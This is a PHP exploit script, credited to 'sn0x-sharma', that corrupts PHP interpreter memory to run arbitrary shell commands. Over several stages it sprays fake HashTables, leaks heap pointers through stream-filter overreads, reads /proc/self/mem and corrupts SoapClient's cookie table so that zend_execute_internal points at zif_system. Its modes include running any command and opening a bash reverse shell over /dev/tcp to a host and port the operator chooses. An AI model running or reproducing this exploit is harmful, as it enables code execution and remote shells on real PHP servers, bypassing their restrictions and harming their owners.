<?php

declare(strict_types=1);
error_reporting(E_ALL & ~E_DEPRECATED);

//  Build-specific constants  (PHP 8.5.7 x86_64 Linux re-derive per binary)

const PHP_STREAM_BUCKET_TAIL_OFFSET = 40;
const FAKE_HT_MARKER_OFFSET         = 56;
const ZEND_EXECUTE_INTERNAL_OFF     = 0x1ce3030;   // offset from PIE base
const ZIF_SYSTEM_OFF                = 0x69f130;    // offset from PIE base
const U32                           = 4294967296;


//  CLI argument parsing

function parse_args(array $argv): array {
    $mode  = '--marker';
    $cmd   = null;
    $lhost = '127.0.0.1';
    $lport = 4444;

    for ($i = 1; $i < count($argv); $i++) {
        switch ($argv[$i]) {
            case '--marker': $mode = '--marker'; break;
            case '--calc':   $mode = '--calc';   break;
            case '--shell':  $mode = '--shell';  break;
            case '--info':   $mode = '--info';   break;
            case '--cmd':
                $mode = '--cmd';
                $cmd  = $argv[++$i] ?? null;
                break;
            case '--lhost':  $lhost = $argv[++$i] ?? $lhost; break;
            case '--lport':  $lport = (int)($argv[++$i] ?? $lport); break;
        }
    }
    return compact('mode', 'cmd', 'lhost', 'lport');
}

//  Build the shell command for the requested mode

function build_command(array $args): string {
    $markerPath = '/tmp/php857_rce_' . getmypid() . '.txt';

    switch ($args['mode']) {

        case '--marker':
            // Portable Linux proof — write PHP857_RCE to /tmp
            define('MARKER_PATH', $markerPath);
            return 'printf PHP857_RCE > ' . escapeshellarg($markerPath);

        case '--calc':
            // Linux: xcalc (X11); fallback gnome-calculator; Windows: calc.exe
            if (PHP_OS_FAMILY === 'Windows') {
                return 'calc.exe';
            }
            // Try xcalc first, fall back to gnome-calculator
            return 'xcalc &>/dev/null & sleep 0.5 || gnome-calculator &>/dev/null &';

        case '--cmd':
            if ($args['cmd'] === null) {
                fwrite(STDERR, "[!] --cmd requires a command argument\n");
                exit(1);
            }
            return $args['cmd'];

        case '--shell':
            // Bash reverse shell to lhost:lport
            $h = escapeshellarg($args['lhost']);
            $p = (int)$args['lport'];
            return "bash -i >& /dev/tcp/{$args['lhost']}/{$p} 0>&1 &";

        case '--info':
            // Dry-run — no shell command needed; we exit after printing
            return '/bin/true';

        default:
            return 'printf PHP857_RCE > ' . escapeshellarg($markerPath);
    }
}

//  Core primitives

/**
 * Type-confusion property write via ArrayIterator.
 * Bypasses normal accessor/constructor guards on internal classes.
 */
function corrupt_property(object $object, string $property, mixed $value): void {
    $it = new ArrayIterator($object);
    $it[$property] = $value;
}

/**
 * Build a StreamBucket with a type-confused 'data' field.
 * ReflectionClass::newInstanceWithoutConstructor avoids constructor-side
 * validation; bucket resource is set via ReflectionProperty.
 */
function corrupt_streambucket(mixed $bucketResource, mixed $dataValue): StreamBucket {
    $rc   = new ReflectionClass(StreamBucket::class);
    $fake = $rc->newInstanceWithoutConstructor();
    (new ReflectionProperty(StreamBucket::class, 'bucket'))->setValue($fake, $bucketResource);
    corrupt_property($fake, 'data', $dataValue);
    return $fake;
}

/**
 * Build a fake Zend HashTable blob with a unique in-memory marker.
 * The marker lets us locate this allocation after an overread.
 *
 * Layout matches zend_array (zend_hash.h):
 *   gc (8) | u.flags (4) | u.nTableMask (4) | *arData (8) | ...
 */
function fake_hashtable_blob(string $marker, int $arData, int $mask): string {
    $blob  = pack('V', 1);           // gc.refcount
    $blob .= pack('V', 7);           // gc.type_info / u.flags
    $blob .= pack('V', 0);           // u.nNumUsed
    $blob .= pack('V', $mask);       // u.nTableMask
    $blob .= pack('P', $arData);     // *arData  (64-bit LE pointer)
    $blob .= pack('V', 0);           // nNumOfElements
    $blob .= pack('V', 0);           // nTableSize
    $blob .= pack('V', 1);           // nInternalPointer
    $blob .= pack('V', 0);           // nNextFreeElement (lo)
    $blob .= pack('P', 0);           // pDestructor
    $blob .= pack('P', 0);           // persistent / ...
    return str_pad($blob, FAKE_HT_MARKER_OFFSET, "\0") . $marker . "\0\0";
}

/**
 * Run a named user-space stream filter on a temporary stream.
 * Returns the bytes emitted to the output brigade.
 */
function run_filter(string $name): string {
    $fp = fopen('php://temp', 'w+');
    stream_filter_append($fp, $name, STREAM_FILTER_WRITE);
    fwrite($fp, 'x');
    fflush($fp);
    rewind($fp);
    return stream_get_contents($fp);
}

//  Process / binary introspection  (Linux /proc)

function php_binary_base(): int {
    $binary = PHP_BINARY;
    foreach (file('/proc/self/maps', FILE_IGNORE_NEW_LINES) as $line) {
        if (!str_ends_with($line, $binary)) {
            continue;
        }
        if (!preg_match('/^([0-9a-f]+)-[0-9a-f]+\s+..x.\s+([0-9a-f]+)/', $line, $m)) {
            continue;
        }
        return intval(hexdec($m[1])) - intval(hexdec($m[2]));
    }
    throw new RuntimeException('[!] Failed to locate PHP PIE base in /proc/self/maps');
}

function php_binary_rw_ranges(): array {
    $binary = PHP_BINARY;
    $ranges = [];
    foreach (file('/proc/self/maps', FILE_IGNORE_NEW_LINES) as $line) {
        if (!str_ends_with($line, $binary)) {
            continue;
        }
        if (preg_match('/^([0-9a-f]+)-([0-9a-f]+)\s+rw.p/', $line, $m)) {
            $ranges[] = [intval(hexdec($m[1])), intval(hexdec($m[2]))];
        }
    }
    return $ranges;
}

/**
 * Walk RW sections looking for a 4-byte slot that:
 *   • Is 0xffffffff (empty hash slot sentinel)
 *   • Has a bucket-index that maps back to our target arData + satisfies
 *     the mask constraints needed to route the cookie-name hash to arData[0]
 */
function select_hash_mask(int $arData, int $hashLow32): array {
    $mem = fopen('/proc/self/mem', 'rb');
    foreach (php_binary_rw_ranges() as [$start, $end]) {
        for ($slot = $start; $slot < $end; $slot += 4) {
            $delta = $slot - $arData;
            if (($delta % 4) !== 0) {
                continue;
            }
            $idx = intdiv($delta, 4);
            if ($idx < -2147483648 || $idx > 2147483647) {
                continue;
            }
            $idx32 = $idx & 0xffffffff;
            if (($idx32 & $hashLow32) !== $hashLow32) {
                continue;
            }
            fseek($mem, $slot);
            $raw = fread($mem, 4);
            if (strlen($raw) !== 4) {
                continue;
            }
            if (unpack('V', $raw)[1] === 0xffffffff) {
                return [$idx32 & (~$hashLow32 & 0xffffffff), $slot, $idx32];
            }
        }
    }
    throw new RuntimeException('[!] Failed to locate compatible hash slot in RW section');
}

//  Custom stream filter — stage 1: heap spray + bucket overread

final class FakeHashFilter extends php_user_filter {
    public static int    $victimLen  = 262144;
    public static string $tag        = '';
    public static int    $arData     = 0;
    public static int    $mask       = 0;
    public static array  $fakeBuckets = [];
    public static array  $keepAlive   = [];
    private bool $done = false;

    public function filter($in, $out, &$consumed, bool $closing): int {
        while ($bucket = stream_bucket_make_writeable($in)) {
            $consumed += $bucket->datalen;
        }
        if ($closing || $this->done) {
            return PSFS_PASS_ON;
        }
        $this->done = true;

        // Allocate a large victim bucket — its zval pointer leaks via overread
        $victim = stream_bucket_new($this->stream, str_repeat('V', self::$victimLen));

        // Spray 1 024 marker-bearing fake HashTable blobs
        for ($i = 0; $i < 1024; $i++) {
            $fakeMarker           = 'RH' . self::$tag . sprintf('%06d', $i);
            self::$fakeBuckets[$i] = stream_bucket_new(
                $this->stream,
                fake_hashtable_blob($fakeMarker, self::$arData, self::$mask)
            );
        }

        // Carrier bucket — its resource pointer is smuggled into the confused fake
        $carrier = stream_bucket_new($this->stream, 'rce-carrier');
        $fake    = corrupt_streambucket($carrier->bucket, $victim->bucket);
        self::$keepAlive[] = [$victim, $carrier, $fake];
        stream_bucket_append($out, $fake);
        return PSFS_PASS_ON;
    }
}

//  Custom stream filter — stage 2: address overread

final class OverreadFilter extends php_user_filter {
    public static int   $fakeStringPointer = 0;
    public static array $keepAlive         = [];
    private bool $done = false;

    public function filter($in, $out, &$consumed, bool $closing): int {
        while ($bucket = stream_bucket_make_writeable($in)) {
            $consumed += $bucket->datalen;
        }
        if ($closing || $this->done) {
            return PSFS_PASS_ON;
        }
        $this->done = true;
        $carrier = stream_bucket_new($this->stream, 'rce-read-carrier');
        $fake    = corrupt_streambucket($carrier->bucket, self::$fakeStringPointer);
        self::$keepAlive[] = [$carrier, $fake];
        stream_bucket_append($out, $fake);
        return PSFS_PASS_ON;
    }
}

//  Marker search

function marker_offset(string $data, string $tag): array {
    $regex = '/RH' . preg_quote($tag, '/') . '[0-9]{6}/';
    if (!preg_match($regex, $data, $match, PREG_OFFSET_CAPTURE)) {
        throw new RuntimeException('[!] Fake HashTable marker not found in overread data');
    }
    return [$match[0][0], $match[0][1], (int) substr($match[0][0], -6)];
}

//  Minimal SOAP response server  (loopback, single-connection)

function http_server(int $port, string $readyPath, string $capturePath, string $cookieName): never {
    $server = stream_socket_server("tcp://127.0.0.1:$port", $errno, $errstr);
    if (!$server) {
        file_put_contents($readyPath, "error:$errno:$errstr");
        exit(1);
    }
    file_put_contents($readyPath, 'ready');

    $conn = @stream_socket_accept($server, 10);
    if (!$conn) {
        file_put_contents($capturePath, '');
        exit(2);
    }
    stream_set_timeout($conn, 2);

    $request       = '';
    $contentLength = null;

    while (!feof($conn)) {
        $chunk = fread($conn, 8192);
        if ($chunk === '') {
            $meta = stream_get_meta_data($conn);
            if (!empty($meta['timed_out'])) {
                break;
            }
            usleep(10000);
            continue;
        }
        $request  .= $chunk;
        $headerEnd = strpos($request, "\r\n\r\n");
        if ($headerEnd !== false && $contentLength === null) {
            $headers = substr($request, 0, $headerEnd);
            if (preg_match('/\r\nContent-Length:\s*(\d+)/i', $headers, $m)) {
                $contentLength = (int) $m[1];
            }
        }
        if ($contentLength !== null && $headerEnd !== false) {
            if ((strlen($request) - ($headerEnd + 4)) >= $contentLength) {
                break;
            }
        }
    }

    $body = '<?xml version="1.0"?>'
          . '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">'
          . '<SOAP-ENV:Body><xResponse/></SOAP-ENV:Body></SOAP-ENV:Envelope>';

    fwrite($conn,
        "HTTP/1.1 200 OK\r\n"
        . "Set-Cookie: {$cookieName}=proof; Path=/; Domain=127.0.0.1\r\n"
        . "Content-Type: text/xml; charset=utf-8\r\n"
        . "Content-Length: " . strlen($body) . "\r\n"
        . "Connection: close\r\n\r\n"
        . $body
    );
    fclose($conn);
    fclose($server);
    file_put_contents($capturePath, $request);
    exit(0);
}

function start_server(string $capturePath, string $cookieName): array {
    for ($attempt = 0; $attempt < 20; $attempt++) {
        $port      = random_int(20000, 55000);
        $readyPath = sys_get_temp_dir() . '/php857-rce-ready-' . getmypid() . '-' . $attempt;
        @unlink($readyPath);

        $cmd  = escapeshellarg(PHP_BINARY)
              . ' -n ' . escapeshellarg(__FILE__)
              . ' server ' . $port
              . ' '  . escapeshellarg($readyPath)
              . ' '  . escapeshellarg($capturePath)
              . ' '  . escapeshellarg($cookieName);

        $proc = proc_open($cmd, [
            0 => ['file', '/dev/null', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w'],
        ], $pipes);

        if (!is_resource($proc)) {
            continue;
        }
        for ($i = 0; $i < 50; $i++) {
            if (is_file($readyPath)) {
                if (file_get_contents($readyPath) === 'ready') {
                    return [$port, $proc, $pipes, $readyPath];
                }
                break;
            }
            usleep(100000);
        }
        proc_terminate($proc);
        proc_close($proc);
    }
    throw new RuntimeException('[!] Failed to start local SOAP response server');
}

//  Sub-process entry point: loopback HTTP server

if (($argv[1] ?? '') === 'server') {
    http_server((int) $argv[2], $argv[3], $argv[4], $argv[5]);
}

//  Pre-flight checks

if (!class_exists(SoapClient::class)) {
    fwrite(STDERR, "[!] SOAP extension required — recompile PHP with --enable-soap\n");
    exit(1);
}
if (PHP_OS_FAMILY !== 'Linux') {
    fwrite(STDERR, "[!] /proc-based introspection requires Linux — aborting\n");
    exit(1);
}

$args    = parse_args($argv);
$command = build_command($args);

echo "[*] PHP857 RCE — sn0x-sharma\n";
echo "[*] Mode    : {$args['mode']}\n";
echo "[*] Command : $command\n";
echo "[*] PHP     : " . PHP_VERSION . " (" . PHP_BINARY . ")\n";
echo "[*] PID     : " . getmypid() . "\n\n";

//  --info mode: dry-run, print addresses and exit

if ($args['mode'] === '--info') {
    $base                = php_binary_base();
    $zendExecuteInternal = $base + ZEND_EXECUTE_INTERNAL_OFF;
    $zifSystem           = $base + ZIF_SYSTEM_OFF;
    printf("[*] php_base                 = 0x%016x\n", $base);
    printf("[*] zend_execute_internal    = 0x%016x\n", $zendExecuteInternal);
    printf("[*] zif_system               = 0x%016x\n", $zifSystem);
    printf("[*] RW ranges:\n");
    foreach (php_binary_rw_ranges() as [$s, $e]) {
        printf("      0x%016x – 0x%016x\n", $s, $e);
    }
    echo "\n[*] Dry-run complete — no execution.\n";
    exit(0);
}

//  Stage 0: Resolve build-specific addresses

echo "[+] Stage 0: Resolving addresses...\n";
$base                = php_binary_base();
$zendExecuteInternal = $base + ZEND_EXECUTE_INTERNAL_OFF;
$zifSystem           = $base + ZIF_SYSTEM_OFF;
$cookieName          = (string) $zifSystem;   // numeric-looking name → integer key path
$fakeArData          = $zendExecuteInternal - 16;

printf("    php_base              = 0x%016x\n", $base);
printf("    zend_execute_internal = 0x%016x\n", $zendExecuteInternal);
printf("    zif_system            = 0x%016x\n", $zifSystem);
printf("    cookie_name (numeric) = %s\n",      $cookieName);
printf("    fake_arData           = 0x%016x\n", $fakeArData);

[$hashMask, $hashSlot, $hashIndex] = select_hash_mask($fakeArData, $zifSystem & 0xffffffff);
printf("    hash_slot             = 0x%016x\n", $hashSlot);
printf("    hash_index            = 0x%08x\n",  $hashIndex);
printf("    hash_mask             = 0x%08x\n",  $hashMask);

//  Stage 1 & 2: Register filters, run heap spray + overread

echo "\n[+] Stage 1: Registering filters...\n";
FakeHashFilter::$tag    = bin2hex(random_bytes(4));
FakeHashFilter::$arData = $fakeArData;
FakeHashFilter::$mask   = $hashMask;
stream_filter_register('rce.fake.leak', FakeHashFilter::class);
stream_filter_register('rce.overread',  OverreadFilter::class);

echo "[+] Stage 2: Heap spray + bucket pointer leak...\n";
$stage = run_filter('rce.fake.leak');
$victimPtr = unpack('Pptr', str_pad(substr($stage, 0, 8), 8, "\0"))['ptr'];
printf("    victim_bucket_ptr     = 0x%016x\n", $victimPtr);

echo "[+] Stage 3: Overread to locate fake HashTable in heap...\n";
OverreadFilter::$fakeStringPointer = $victimPtr + 16;
$overread = run_filter('rce.overread');

[$fakeMarker, $fakeMarkerOffset, $fakeIndex] = marker_offset($overread, FakeHashFilter::$tag);
$fakeMarkerAddress = $victimPtr + PHP_STREAM_BUCKET_TAIL_OFFSET + $fakeMarkerOffset;
$fakeHashAddress   = $fakeMarkerAddress - FAKE_HT_MARKER_OFFSET;

printf("    fake_marker           = %s (index=%d offset=%d)\n",
    $fakeMarker, $fakeIndex, $fakeMarkerOffset);
printf("    fake_hash_address     = 0x%016x\n", $fakeHashAddress);

//  Stage 4: Start loopback SOAP server

echo "\n[+] Stage 4: Starting loopback SOAP response server...\n";
$capturePath = sys_get_temp_dir() . '/php857-rce-capture-' . getmypid() . '.txt';
@unlink($capturePath);
[$port, $proc, $pipes, $readyPath] = start_server($capturePath, $cookieName);
printf("    server listening on 127.0.0.1:%d\n", $port);

//  Stage 5: Corrupt SoapClient::_cookies and trigger the cookie-update path

echo "\n[+] Stage 5: Corrupting SoapClient cookie table...\n";
$client = new SoapClient(null, [
    'location' => "http://127.0.0.1:$port/",
    'uri'      => 'urn:x',
    'trace'    => true,
]);
corrupt_property($client, "\0SoapClient\0_cookies", $fakeHashAddress);
printf("    _cookies overwritten  → 0x%016x\n", $fakeHashAddress);

echo "[+] Stage 6: Triggering SOAP call → numeric cookie hash update...\n";
$client->__soapCall('x', []);
echo "    overwrite_returned\n";

foreach ($pipes as $pipe) {
    fclose($pipe);
}
proc_close($proc);
@unlink($readyPath);

//  Stage 7: Trigger corrupted dispatch → zif_system() → command execution

echo "\n[+] Stage 7: Pulling trigger — invoking corrupted dispatch hook...\n";
$trigger = 'md5';
$trigger($command);

//  Proof check  (marker mode only)

if ($args['mode'] === '--marker') {
    $mp = defined('MARKER_PATH') ? MARKER_PATH : '/tmp/php857_rce_' . getmypid() . '.txt';
    echo "\n[*] Checking marker file: $mp\n";
    if (is_file($mp) && str_contains(file_get_contents($mp), 'PHP857_RCE')) {
        $content = file_get_contents($mp);
        echo "[✓] MARKER FOUND: $content\n";
        echo "[✓] RCE CONFIRMED on PHP " . PHP_VERSION . "\n";
    } else {
        echo "[✗] Marker not found — execution may have failed or layout differed\n";
    }
}

echo "\n[*] Done.\n";
exit(0);
